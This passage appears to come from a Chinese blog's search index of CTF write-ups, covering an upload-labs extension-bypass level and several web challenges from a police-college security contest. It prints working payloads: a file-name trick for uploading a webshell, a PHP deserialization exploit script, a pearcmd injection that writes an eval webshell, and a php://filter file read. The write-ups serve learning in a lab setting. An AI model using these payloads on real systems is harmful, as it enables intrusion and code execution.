class="line"></span><br></pre></td></tr></table></figure><h2 id="方法一-2"><a href="#方法一-2" class="headerlink" title="方法一"></a>方法一</h2><p>直接上传图片马即可，可以在返回页面中得到图片名称</p><h1 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$UPLOAD_ADDR</span>)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file_name</span>,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$img_path</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$img_path</span>)) &#123; </span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传失败！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;禁止保存为该类型文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="解法-14"><a href="#解法-14" class="headerlink" title="解法"></a>解法</h2><p><code>move_uploaded_file</code>这个函数会忽略<code>/</code>，因此可以修改上传的文件名为：<code>webshell.php/.</code>即可成功上传，测试连接成功。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>黄河流域公安院校网络空间安全技能挑战赛WP</title>
      <link href="/2023/03/12/%E9%BB%84%E6%B2%B3%E6%B5%81%E5%9F%9F%E5%85%AC%E5%AE%89%E9%99%A2%E6%A0%A1%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9BWP/"/>
      <url>/2023/03/12/%E9%BB%84%E6%B2%B3%E6%B5%81%E5%9F%9F%E5%85%AC%E5%AE%89%E9%99%A2%E6%A0%A1%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9BWP/</url>
      
        <content type="html"><![CDATA[<blockquote><p>WP原文：<a href="https://rb61qxxiv7.feishu.cn/docs/doccnFcZA8xHDlJNUFQs4QEXqvg#">https://rb61qxxiv7.feishu.cn/docs/doccnFcZA8xHDlJNUFQs4QEXqvg#</a></p></blockquote><blockquote><p>就做出来了一个ezphp，而且还是靠google原题嗯抄的，学习之路真是任重而道远。</p></blockquote><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678004599199-79d1bc55-533b-463b-b116-f14a209b86d7.png" alt="9956ef16896bd6c730cea9b401218c2.png"></p><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="babyPHP"><a href="#babyPHP" class="headerlink" title="babyPHP"></a>babyPHP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&#x27;|\&quot;|\`| |&lt;|&gt;|?|\^|%|\$/&quot;</span>, <span class="variable">$num</span>)) &#123;</span><br><span class="line">           <span class="keyword">die</span>(<span class="string">&quot;nononno&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">eval</span>(<span class="string">&quot;return $&#123;num&#125; != 2;&quot;</span>) &amp;&amp; <span class="variable">$num</span> == <span class="number">0</span> &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$num</span>) != <span class="literal">true</span>) &#123;</span><br><span class="line"> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat flag.php&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目主要考察的是php的运算符的比较级。<br>payload：<code>?num=1|2</code><br>flag在源代码里面。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678001464588-77225b4a-cf0b-4a51-8212-30b8bd77afa1.png" alt="image.png"></p><h2 id="funnyPHP"><a href="#funnyPHP" class="headerlink" title="funnyPHP"></a>funnyPHP</h2><p>上来给出的地址是：<code>/hint.php</code>，页面下为<code>phpinfo()</code>参数页面：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678001660449-14587bf3-10c9-476f-a1e9-22d501efdc52.png" alt="image.png"><br>访问根目录<code>/</code>出现以下情况：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678001606854-f0128886-182c-4eb5-9172-6c0387e9e027.png" alt="image.png"><br>这里为 PHP Development Server 启动的服务。然后就出现了本题的考点：</p><h3 id="PHP-lt-7-4-21-Development-Server源码泄露漏洞"><a href="#PHP-lt-7-4-21-Development-Server源码泄露漏洞" class="headerlink" title="PHP&lt;=7.4.21 Development Server源码泄露漏洞"></a>PHP&lt;=7.4.21 Development Server源码泄露漏洞</h3><blockquote><p><a href="https://cn-sec.com/archives/1530845.html">https://cn-sec.com/archives/1530845.html</a><br><a href="https://blog.projectdiscovery.io/php-http-server-source-disclosure/">https://blog.projectdiscovery.io/php-http-server-source-disclosure/</a></p></blockquote><p>我最开始在bp中手动输入那个\r\n但是发现不行，经过尝试才知道需要先关闭<code>Updates COntentLength</code>并且打开<code>hide non—printable chars</code>，这两个分别在以下位置：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678002498712-172f96c6-35b8-4f31-b5f9-d17c822dc312.png" alt="image.png"><br>和<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678002518945-25f2f952-9851-4f47-ba31-d199acf26ce3.png" alt="image.png"><br>分别打开之后，按照以下格式发送即可。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678002554239-5388e99a-8075-4082-a0a1-3b696ffb131b.png" alt="image.png"><br>之后就能够获得到puzzle.php的内容。其中考察的是php的反序列化。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sdpc</span> = [<span class="string">&quot;welcome&quot;</span> =&gt; <span class="string">&quot;yeah, something hidden.&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$name</span>[<span class="variable">$name</span>]();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a-&gt;sdpc[<span class="string">&quot;welcome&quot;</span>]; <span class="comment">//对大家表示欢迎</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b ? <span class="variable language_">$this</span>-&gt;c-&gt;<span class="title function_ invoke__">sdpc</span>(<span class="string">&#x27;welcom&#x27;</span>) : <span class="string">&#x27;welcome!&#x27;</span>.<span class="variable language_">$this</span>-&gt;c; <span class="comment">//变着法欢迎大家</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Evil</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/fl4g&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;sdpc&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;sdpc&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">C</span>());</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>exp.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sdpc</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sdpc = <span class="keyword">array</span>(<span class="string">&quot;sdpc&quot;</span> =&gt; <span class="keyword">array</span>(<span class="keyword">new</span> <span class="title class_">Evil</span>(),<span class="string">&#x27;getflag&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$name</span>[<span class="variable">$arguments</span>]();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a-&gt;sdpc[<span class="string">&quot;welcome&quot;</span>]; <span class="comment">//对大家表示欢迎</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b ? <span class="variable language_">$this</span>-&gt;c-&gt;<span class="title function_ invoke__">sdpc</span>(<span class="string">&#x27;welcom&#x27;</span>) : <span class="string">&#x27;welcome!&#x27;</span> . <span class="variable language_">$this</span>-&gt;c; <span class="comment">//设置 b ，触发 ___call</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Evil</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/fl4g&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ca</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$cb</span> = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$cc</span> = <span class="keyword">new</span> <span class="title function_ invoke__">C</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$cc</span>-&gt;b = <span class="string">&#x27;sp4c1ous&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$cc</span>));</span><br></pre></td></tr></table></figure><p>用post传入：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678003313844-de470c08-436b-496a-b1f6-193a5bd1252e.png" alt="image.png"></p><h2 id="ezinclude"><a href="#ezinclude" class="headerlink" title="ezinclude"></a>ezinclude</h2><blockquote><p><a href="https://blog.csdn.net/RABCDXB/article/details/122050370">https://blog.csdn.net/RABCDXB/article/details/122050370</a></p></blockquote><p>pearcmd的利用，但是并不会。先把官方wp粘在这里吧。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?+config-create+/&amp;sdpc=/usr/local/lib/php/pearcmd.php&amp;/<span class="meta">&lt;?</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">0</span>]);<span class="meta">?&gt;</span>+/tmp/hello.php</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678004112573-9e6a567b-86ce-4314-b98e-99214b391728.png" alt="output.png"></p><h2 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h2><blockquote><p><a href="https://www.anquanke.com/post/id/284901">https://www.anquanke.com/post/id/284901</a></p></blockquote><p>就做出来了这一个，还是抄的。。。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677900359894-8183856c-3d9a-409b-9d34-eea5aff2dcb3.png" alt="image.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$g</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;g&#x27;</span>];</span><br><span class="line"><span class="variable">$t</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;t&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable">$g</span>(<span class="variable">$t</span>);</span><br></pre></td></tr></table></figure><p>根据图片，直接传入payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?g=<span class="built_in">SplFileObject</span>&amp;t=php:<span class="comment">//filter/convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2><meta name="referrer" content="no-referrer" />]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
